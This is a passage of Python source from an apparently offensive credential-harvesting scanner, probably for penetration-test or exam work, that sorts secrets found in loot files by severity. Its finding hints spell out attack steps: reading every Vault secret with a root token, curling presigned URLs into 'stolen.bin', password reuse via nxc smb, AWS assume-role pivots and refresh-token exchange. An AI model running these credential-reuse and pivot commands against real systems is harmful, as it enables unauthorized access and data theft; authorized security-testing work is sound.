                        from analyzers.patterns import HASHES
                        HASHES.append(("1800", "sha512crypt", h, path, lineno))
                        hit = True
                        break
                    # ---- iter-10 dispatch branches ----
                    # Vault unseal key: high-value, marks a vault as crackable
                    # (need M of N keys to unseal; if you have N keys in loot,
                    # you OWN the vault).
                    if name == "Vault unseal key":
                        k = am.group(1)
                        # iter-11 FP audit: HashiCorp docs publish literal sample
                        # 'Unseal Key 1: dEadBeEf...' rows; add is_known_example
                        # + canonical-sample gate alongside the placeholder check.
                        if (filters.is_placeholder(k) or filters.is_known_example(k)
                                or filters.is_canonical_sample(k)):
                            continue
                        report.add("CRITICAL", "ASSIGNED SECRETS", path, lineno,
                                   f"Vault unseal key share: {k}",
                                   hint="vault operator unseal '" + k + "'  (need M of N shares; collect from loot)")
                        hit = True
                        break
                    if name == "Vault root token":
                        t = am.group(1)
                        if (filters.is_placeholder(t) or filters.is_known_example(t)
                                or filters.is_canonical_sample(t)):
                            continue
                        report.add("CRITICAL", "ASSIGNED SECRETS", path, lineno,
                                   f"Vault root token: {t}",
                                   hint="export VAULT_TOKEN='" + t + "'; vault secrets list  - read EVERY mounted secret store")
                        hit = True
                        break
                    if name == "kubectl --token":
                        t = am.group(1)
                        # iter-11: also placeholder-gate kubectl bearer
                        if filters.is_placeholder(t):
                            continue
                        # iter-12 composite gate: a real kubectl invocation
                        # carries --server / --kubeconfig / -s / --insecure
                        # OR the same line has the api server URL. A bare
                        # `kubectl --token=...` in a tutorial usually doesn't.
                        if not re.search(
                            r'(?i)--server[=\s]+\S|--kubeconfig[=\s]+\S|'
                            r'-s\s+https?://|--insecure-skip-tls-verify|'
                            r'https?://[^\s]+:6443|api\.\w+\.k8s', line):
                            # downgrade to HIGH (no auth-complete context)
                            sev = "HIGH"
                            sevhint = ("kubectl bearer token (no server on this line) - "
                                       "check operator notes for the K8s API endpoint")
                        else:
                            sev = "CRITICAL"
                            sevhint = ("kubectl --token='" + t +
                                       "' --server=<api> auth can-i --list  - enumerate role privs")
                        report.add(sev, "ASSIGNED SECRETS", path, lineno,
                                   f"kubectl bearer token: {t[:30]}...",
                                   hint=sevhint)
                        hit = True
                        break
                    if name == "Helm values secret":
                        var, val = am.group(1), am.group(2)
                        # iter-11 FP audit: helm 'secretKey: TBD-later' on a
                        # README/schema/example file is documentation. Gate on
                        # known helm-shaped filenames + the existing placeholder
                        # check; also reject 'tbd', 'fixme', 'todo' literals.
                        base = os.path.basename(path).lower()
                        if (filters.is_placeholder(val)
                                or filters.is_known_example(val)
                                or filters.is_doc_file(path)
                                or base.endswith((".schema.json", "-schema.yaml"))
                                or "example" in base or "sample" in base):
                            continue
                        if val.lower() in ("tbd", "fixme", "todo", "later",
                                           "tbd-later", "fill-in", "fill_in",
                                           "_template_"):
                            continue
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"Helm values.{var}: {val}",
                                   hint="reuse on the deployed service or pod's container")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=val,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "Terraform tfvars secret":
                        var, val = am.group(1), am.group(2)
                        if filters.is_placeholder(val):
                            continue
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"tfvars {var}: {val}",
                                   hint="terraform .tfvars literal - reuse for the provisioned resource")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=val,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "S3 presigned URL":
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"S3/GCS presigned URL: {line.strip()[:120]}",
                                   hint="curl '<url>' -o stolen.bin   - signed URL gives direct access without further auth")
                        hit = True
                        break
                    if name == "AWS assume-role profile":
                        role = am.group(1)
                        report.add("HIGH", "RECON", path, lineno,
                                   f"AWS assume-role chain: {role}",
                                   hint="aws sts assume-role --role-arn '" + role + "' --role-session-name s   - multi-account pivot")
                        hit = True
                        break
                    if name == "Jenkins build env secret":
                        val = am.group(1).strip()
                        if filters.is_placeholder(val):
                            continue
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"Jenkins build env secret: {line.strip()[:140]}",
                                   hint="Jenkins build leaked a secret in env dump - reuse on the target service")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=val,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # SaaS service token: VAR_NAME=value
                    if name == "SaaS service token":
                        var, val = am.group(1), am.group(2)
                        if filters.is_placeholder(val) or filters.is_canonical_sample(val):
                            continue
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"{var}: {val}",
                                   hint=f"SaaS API token for {var} - validate offline by checking format; do NOT hit live endpoints during the exam")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=val,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # ---- iter-11 deep-corpus dispatch branches ----
                    if name == "AAD/MSA refresh token":
                        tok = am.group(1)
                        report.add("CRITICAL", "ASSIGNED SECRETS", path, lineno,
                                   f"AAD/MSA refresh token: {tok[:30]}...",
                                   hint="exchange for access token: TokenTactics / ROADtools; FOCI=1 means it works for ANY 1P app")
                        hit = True
                        break
                    if name == "AAD FOCI marker":
                        # iter-13: intel-only marker (no credential value).
                        # Demote to LOW - context for the paired refresh_token.
                        report.add("LOW", "RECON", path, lineno,
                                   "AAD FOCI=1 (refresh token works for any 1P Microsoft app)",
                                   hint="pair with the AAD refresh_token above; foci tokens grant Graph/AzureCLI/Teams scopes interchangeably")
                        hit = True
                        break
                    if name == "Cisco type-7 password":
                        ct = am.group(1)
                        report.add("CRITICAL", "PASSWORD HASHES", path, lineno,
                                   f"Cisco type-7 reversible: {ct}",
                                   hint="instant decode: ciscot7.py -d " + ct + "  - reversible XOR with published key")
                        from analyzers.patterns import HASHES
                        HASHES.append(("0", "Cisco type-7", ct, path, lineno))
                        hit = True
                        break
                    if name in ("PFX export/import password",
                                "Certipy -pfx password"):
                        pw = am.group(1).strip("'\"")
                        if filters.is_placeholder(pw):
                            continue
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"PFX cert password: {pw}",
                                   hint=f"openssl pkcs12 -in <file> -nodes -password pass:'{pw}'  - extract key; certipy auth -pfx <out> -password '{pw}'")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=pw,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "mRemoteNG Node creds":
                        u, p = am.group(1), am.group(2)
                        report.add("HIGH", "CRED PAIRS", path, lineno,
                                   f"mRemoteNG node: {u}:<encrypted {p[:20]}...>",
                                   hint="mremoteng-decrypt.py -f confCons.xml  - AES-CBC w/ default key 'mR3m'; cleartext on stdout")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="ciphertext", user=u,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "pidgin IM cleartext":
                        proto, u, p = am.group(1), am.group(2), am.group(3)
                        if filters.is_placeholder(p):
                            continue
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"pidgin {proto}: {u}:{p}",
                                   hint=f"plaintext IM cred - reuse: this acct often shares pw with the host or domain account")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u, plaintext=p,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "curl/wget -u basic-auth":
                        u, p = am.group(1), am.group(2)
                        if filters.is_placeholder(p) or filters.is_placeholder(u):
                            continue
                        # iter-176: shell-escape u + p.
                        _u_sh_hb = u.replace("'", "'\\''")
                        _p_sh_hb = p.replace("'", "'\\''")
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"HTTP basic on cmdline: {u}:{p}",
                                   hint=f"reuse: nxc smb <host> -u '{_u_sh_hb}' -p '{_p_sh_hb}' ; also try VPN / SSO / webmail")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u, plaintext=p,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "AD custom-attr b64 password":
                        attr, b64v = am.group(1), am.group(2)
                        # only fire on LDIF-shaped basenames or surroundings;
                        # this rule is line-only so check filename + skip code/doc
                        plow = path.lower()
                        is_ldap_artifact = (plow.endswith((".ldif", ".ldap", ".ldp"))
                                            or "ldap" in plow or "bloodhound" in plow
                                            or "cascade" in plow)
                        if not is_ldap_artifact:
                            continue
                        if filters.is_placeholder(b64v) or filters.is_canonical_sample(b64v):
                            continue
                        import base64 as _b64
                        decoded = None
                        try:
                            raw = _b64.b64decode(b64v, validate=True)
                            try:
                                decoded = raw.decode("utf-16-le").rstrip("\x00")
                                if not decoded.isprintable():
                                    decoded = None
                            except Exception:
                                pass
                            if not decoded:
                                try:
                                    decoded = raw.decode("utf-8")
                                    if not decoded.isprintable():
                                        decoded = None
                                except Exception:
                                    pass
                        except Exception:
                            pass
                        if decoded:
                            report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                       f"AD {attr}: {decoded}  (b64-decoded)",
                                       hint=f"custom LDAP attribute carried base64 cleartext - reuse: nxc smb <host> -u <user> -p '{decoded}'")
                            if store is not None:
                                from analyzers.ingest.evidence import Evidence
                                store.add(Evidence(kind="plaintext", plaintext=decoded,
                                                   source=path, line=lineno))
                        else:
                            report.add("HIGH", "ENCODED/DECODED", path, lineno,
                                       f"AD {attr} b64 (decode failed): {b64v[:40]}...",
                                       hint="non-UTF-8/UTF-16 blob; may be NT hash / DPAPI / kerberos key")
                        hit = True
                        break
                    if name in ("netsh wlan Key Content", "wlan keyMaterial XML"):
                        psk = am.group(1).strip()
                        if filters.is_placeholder(psk):
                            continue
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"Wi-Fi PSK: {psk}",
                                   hint="WPA-PSK plaintext - reuse on the captured wifi; also try as host pw (common reuse)")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=psk,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # PHP define('CONST', 'value') -> 2-group capture
                    if name == "PHP define secret":
                        const, val = am.group(1), am.group(2)
                        if not val or filters.is_placeholder(val) or filters.is_code_not_literal(val, line):
                            continue
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"{const}: {val}",
                                   hint="PHP define() literal - reuse directly")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=val, source=path, line=lineno))
                        hit = True
                        break
                    # default 1-group capture
                    val = am.group(1)
                    if not val or filters.is_placeholder(val) or filters.is_code_not_literal(val, line):
                        continue
                    report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                               f"{name}: {val}",
                               hint="plaintext credential in script/config - reuse directly")
                    if store is not None:
                        from analyzers.ingest.evidence import Evidence
                        store.add(Evidence(kind="plaintext", plaintext=val, source=path, line=lineno))
                    hit = True
                    break
                if hit:
                    continue

                # ---- pass 3: generic keyword = value ----
                if credline.looks_like_noise(line):
                    continue
                m = KEY.search(line)
                if not m:
                    continue
                value = re.split(r'\s+[#;]\s', m.group(2).strip())[0].strip()
                if not value:
                    continue
                if require_quote and not (value[:1] in "'\"" or '"' in value or "'" in value):
                    continue
                if not _value_ok(value, line):
                    continue
                snippet = line.strip()
                if len(snippet) > 140:
                    snippet = snippet[:140] + "..."
                report.add("HIGH", "ASSIGNED SECRETS", path, lineno, snippet)
    except Exception:
        pass
    # File-level multi-line passes (after the line-by-line scan completes).
    _multiline_passes(path, report, store)
